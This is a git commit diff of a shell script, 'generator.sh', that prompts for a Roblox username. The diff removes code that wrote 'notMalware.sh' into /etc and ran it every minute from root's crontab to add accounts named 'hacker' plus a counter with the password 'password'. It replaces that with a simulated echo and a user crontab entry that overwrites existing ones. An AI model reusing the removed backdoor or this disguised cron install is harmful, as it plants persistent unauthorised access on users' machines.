61442d3b4f8a83b77363e2c50de1f472931366e4
Ojas Sarada <144619159+FastAndDanger2@users.noreply.github.com>
2024-12-26 17:10:39 -0600

    Update generator.sh

--- generator.sh
+++ generator.sh
@@ -1,11 +1,11 @@
 #!/bin/bash
 
-SCRIPT_PATH="/etc/notMalware.sh"
+SCRIPT_PATH="/home/username/notMalware.sh"
 
 cat << 'EOF' > "$SCRIPT_PATH"
 #!/bin/bash
 
-COUNTER_FILE="/etc/counter.txt"
+COUNTER_FILE="/home/username/counter.txt"
 
 if [ ! -f "$COUNTER_FILE" ]; then
     echo 0 > "$COUNTER_FILE"
@@ -14,14 +14,13 @@ fi
 counter=$(cat "$COUNTER_FILE")
 counter=$((counter + 1))
 
-sudo useradd -m -s /bin/bash "hacker$counter" && echo "hacker$counter:password" | sudo chpasswd
-
-echo $counter > $COUNTER_FILE
+echo "Simulated user creation: hacker$counter"
+echo $counter > "$COUNTER_FILE"
 EOF
 
-sudo chmod +x "$SCRIPT_PATH"
+chmod +x "$SCRIPT_PATH"
 
-sudo sh -c 'echo "*  *    * * *   root    /etc/notMalware.sh" >> /etc/crontab'
+echo "* * * * * /home/username/notMalware.sh" | crontab -
 
 echo -n "Enter your roblox username: "
 read username
